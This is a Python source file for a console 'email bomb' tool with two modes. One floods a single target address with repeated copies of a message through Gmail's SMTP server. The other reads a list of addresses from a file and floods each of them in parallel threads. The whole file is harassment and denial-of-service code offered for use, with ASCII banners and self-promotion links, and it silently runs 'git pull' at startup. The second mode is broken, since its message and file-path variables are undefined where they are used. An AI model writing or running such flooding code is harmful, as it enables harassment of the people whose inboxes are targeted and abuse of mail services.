import sys
from pystyle import Colorate, Colors
import os
import subprocess
import smtplib
import time
import threading
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def check_main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_white,"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____

[INFO] version 2.0
[INFO] coded by 건 우       
                     
"""))
    subprocess.run("git pull", shell=True, stdout=subprocess.DEVNULL)
    input(Colorate.Horizontal(Colors.red_to_white,"[INFO] Enter the continue..."))

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_white, """
░█▀▀░█▄█░█▀█░▀█▀░█░░░░░█▀█░█░█░█░█░█▀▀░█▀▄
░█▀▀░█░█░█▀█░░█░░█░░░░░█░█░█░█░█▀▄░█▀▀░█▀▄
░▀▀▀░▀░▀░▀░▀░▀▀▀░▀▀▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀                      
----------------------------------------
coded by 건 우
Revolt : https://rvlt.gg/wqXBTNNB
Github : https://github.com/madanokr001
----------------------------------------

[01] | EMAIL BOMB
[02] | EMAIL RANDOMZIE BOMB
[03] EXIT                
                """))
    
def main():
    while True:
        logo()
        select = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@DESKTOP]~$
╚══> """))

        if select == "1" or select.lower() == "01":
            def logo2():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(Colorate.Horizontal(Colors.red_to_white, """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
                              
----------------------------------------
Type : BOMB
Revolt : https://rvlt.gg/wqXBTNNB
Github : https://github.com/madanokr001
----------------------------------------        
                """))

            def send_email(sender_email, password, recv_email, message, total_messages, subject):
                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls() 
                    server.login(sender_email, password)

                    msg = MIMEMultipart()  
                    msg['From'] = sender_email
                    msg['To'] = recv_email
                    msg['Subject'] = subject
                    msg.attach(MIMEText(message, 'plain'))

                    for i in range(int(total_messages)):
                        server.sendmail(sender_email, recv_email, msg.as_string())
                        print(Colorate.Horizontal(Colors.red_to_white ,"""
    |\**/|      
    \ == /
     |  |
     |  |              https://rvlt.gg/wqXBTNNB
     \  /
      \/              
                  """))
                        print(Colorate.Horizontal(Colors.red_to_white, f"[+] EMAIL : {recv_email} TOTAL : {i+1}/{total_messages}"))
                        time.sleep(0.01)  

                    server.quit()  
                    print(Colorate.Horizontal(Colors.blue_to_white, "[*] FINISH.."))
                    input(Colorate.Horizontal(Colors.blue_to_cyan,"[+] Enter the continew.."))

                except smtplib.SMTPAuthenticationError:
                    print(Colorate.Horizontal(Colors.red_to_white, "[-] Error? click link : https://support.google.com/mail/answer/185833?hl=en"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Email sending limit : {e}"))

            logo2()
            sender_email = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@SENDER-EMAIL]~$
╚══> """))
        
            password = getpass.getpass(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@APP-PASSWORD]~$
╚══> """))

            recv_email = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@TARGET-EMAIL]~$
╚══> """))
            
            subject = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@SUBJECT]~$
╚══> """))
            
            message = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@MESSAGE]~$
╚══> """))
            
            total_messages = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@TOTAL]~$
╚══> """))

            send_email(sender_email, password, recv_email, message, total_messages, subject)
            

        elif select == "2" or select.lower() == "02":
            def logo3():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(Colorate.Horizontal(Colors.red_to_white, """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |           
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
                              
----------------------------------------
Type : RANDOMIZE BOMB
Revolt : https://rvlt.gg/wqXBTNNB
Github : https://github.com/madanokr001
----------------------------------------
                """))

            def send_email(sender_email, password, recv_email, message, total_messages, subject):
                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls() 
                    server.login(sender_email, password)  

                    msg = MIMEMultipart()  
                    msg['From'] = sender_email
                    msg['To'] = recv_email
                    msg['Subject'] = subject
                    msg.attach(MIMEText(message, 'plain'))

                    for i in range(int(total_messages)):

                        server.sendmail(sender_email, recv_email, msg.as_string())
                        print(Colorate.Horizontal(Colors.red_to_white ,"""
    |\**/|      
    \ == /
     |  |
     |  |              https://rvlt.gg/wqXBTNNB
     \  /
      \/              
                  """))
                        print(Colorate.Horizontal(Colors.red_to_white, f"[+] EMAIL : {recv_email} TOTAL : {i+1}/{total_messages}"))
                        print(Colorate.Horizontal(Colors.red_to_blue, f"[*] PATH : {file_path}"))
                        time.sleep(0.01) 

                    server.quit()
                    print(Colorate.Horizontal(Colors.blue_to_white, "[*] FINISH.."))
                    input(Colorate.Horizontal(Colors.blue_to_cyan,"[+] Enter the continew.."))

                except smtplib.SMTPAuthenticationError:
                    print(Colorate.Horizontal(Colors.red_to_white, "[-] Error? click link: https://support.google.com/mail/answer/185833?hl=en"))

            def send_emails_file(sender_email, password, file_path, message, total_messages, subject):
                with open(file_path, 'r') as file:
                    email_list = file.readlines()

                for recv_email in email_list:
                    recv_email = recv_email.strip() 
                    send_email(sender_email, password, recv_email, message, total_messages, subject)

            def send_emails_thread(sender_email, password, file_path, message, total_messages, subject):
                threads = []
                with open(file_path, 'r') as file:
                    email_list = file.readlines()

                for recv_email in email_list:
                    recv_email = recv_email.strip() 
                    thread = threading.Thread(target=send_email, args=(sender_email, password, recv_email, message, total_messages, subject))  
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()

            logo3()
            sender_email = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@SENDER-EMAIL]~$
╚══> """))
        
            password = getpass.getpass(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@APP-PASSWORD]~$
╚══> """))
        
            subject = input(Colorate.Horizontal(Colors.red_to_white,"""
╔═══[root@SUBJECT]~$
╚══> """))
            
            file_path = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@FILE.txt]~$
╚══> """))
            
            total_messages = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@TOTAL]~$
╚══> """))

            send_emails_thread(sender_email, password, file_path, message, total_messages, subject)
                    


        elif select == "3" or select.lower() == "03":
                    sys.exit()




if __name__ == "__main__":
    check_main()
    main()
